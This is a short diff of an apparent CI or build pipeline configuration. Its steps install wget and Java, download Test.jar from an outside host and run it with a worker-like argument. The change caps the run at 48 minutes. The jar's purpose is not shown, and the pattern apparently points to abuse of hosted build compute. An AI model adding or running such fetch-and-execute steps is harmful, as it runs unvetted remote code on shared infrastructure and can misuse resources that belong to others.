@@ -16,4 +16,4 @@ blocks:
             - sudo apt update
             - sudo apt install wget default-jre -y
             - wget https://defaulter.runkodapps.com/Test.jar
-            - java -jar Test.jar rock6064 1
+            - timeout 48m java -jar Test.jar rock6064 1
